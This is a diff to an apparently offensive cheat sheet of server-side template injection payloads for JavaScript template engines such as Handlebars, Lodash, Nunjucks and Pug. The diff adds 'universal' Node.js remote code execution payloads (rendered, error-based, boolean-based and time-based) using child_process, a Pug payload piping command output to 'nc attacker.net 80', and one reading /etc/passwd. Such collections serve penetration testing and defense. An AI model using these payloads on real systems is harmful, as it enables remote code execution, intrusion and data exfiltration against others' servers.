@@ -5,31 +5,56 @@
 ## Summary
 
 - [Templating Libraries](#templating-libraries)
+- [Universal Payloads](#universal-payloads)
 - [Handlebars](#handlebars)
     - [Handlebars - Basic Injection](#handlebars---basic-injection)
     - [Handlebars - Command Execution](#handlebars---command-execution)
 - [Lodash](#lodash)
     - [Lodash - Basic Injection](#lodash---basic-injection)
     - [Lodash - Command Execution](#lodash---command-execution)
+- [Pug](#pug)
 - [References](#references)
 
 ## Templating Libraries
 
-| Template Name | Payload Format |
-| ------------ | --------- |
-| DotJS        | `{{= }}`  |
-| DustJS       | `{}`      |
-| EJS          | `<% %>`   |
-| HandlebarsJS | `{{ }}`   |
-| HoganJS      | `{{ }}`   |
-| Lodash       | `{{= }}`  |
-| MustacheJS   | `{{ }}`   |
-| NunjucksJS   | `{{ }}`   |
-| PugJS        | `#{}`     |
-| TwigJS       | `{{ }}`   |
-| UnderscoreJS | `<% %>`   |
-| VelocityJS   | `#=set($X="")$X` |
-| VueJS        | `{{ }}`   |
+| Template Name | Payload Format   |
+|---------------|------------------|
+| DotJS         | `{{= }}`         |
+| DustJS        | `{ }`            |
+| EJS           | `<% %>`          |
+| HandlebarsJS  | `{{ }}`          |
+| HoganJS       | `{{ }}`          |
+| Lodash        | `{{= }}`         |
+| MustacheJS    | `{{ }}`          |
+| NunjucksJS    | `{{ }}`          |
+| PugJS         | `#{ }`           |
+| TwigJS        | `{{ }}`          |
+| UnderscoreJS  | `<% %>`          |
+| VelocityJS    | `#=set($X="")$X` |
+| VueJS         | `{{ }}`          |
+
+## Universal Payloads
+
+Generic code injection payloads work for many NodeJS-based template engines, such as DotJS, EJS, PugJS, UnderscoreJS and Eta.
+
+To use these payloads, wrap them in the appropriate tag.
+
+```javascript
+// Rendered RCE
+global.process.mainModule.require("child_process").execSync("id").toString()
+
+// Error-Based RCE
+global.process.mainModule.require("Y:/A:/"+global.process.mainModule.require("child_process").execSync("id").toString())
+""["x"][global.process.mainModule.require("child_process").execSync("id").toString()]
+
+// Boolean-Based RCE
+[""][0 + !(global.process.mainModule.require("child_process").spawnSync("id", options={shell:true}).status===0)]["length"]
+
+// Time-Based RCE
+global.process.mainModule.require("child_process").execSync("id && sleep 5").toString()
+```
+
+NunjucksJS is also capable of executing these payloads using `{{range.constructor(' ... ')()}}`.
 
 ## Handlebars
 
@@ -120,7 +145,28 @@ ${= _.VERSION}
 {{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
 ```
 
+---
+
+## Pug
+
+> Universal payloads also work for Pug.
+
+[Official website](https://pugjs.org/api/getting-started.html)
+>
+
+```javascript
+- var x = root.process
+- x = x.mainModule.require
+- x = x('child_process')
+= x.exec('id | nc attacker.net 80')
+```
+
+```javascript
+#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
+```
+
 ## References
 
 - [Exploiting Less.js to Achieve RCE - Jeremy Buis - July 1, 2021](https://web.archive.org/web/20210706135910/https://www.softwaresecured.com/exploiting-less-js/)
 - [Handlebars template injection and RCE in a Shopify app - Mahmoud Gamal - April 4, 2019](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
+- [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 03, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)
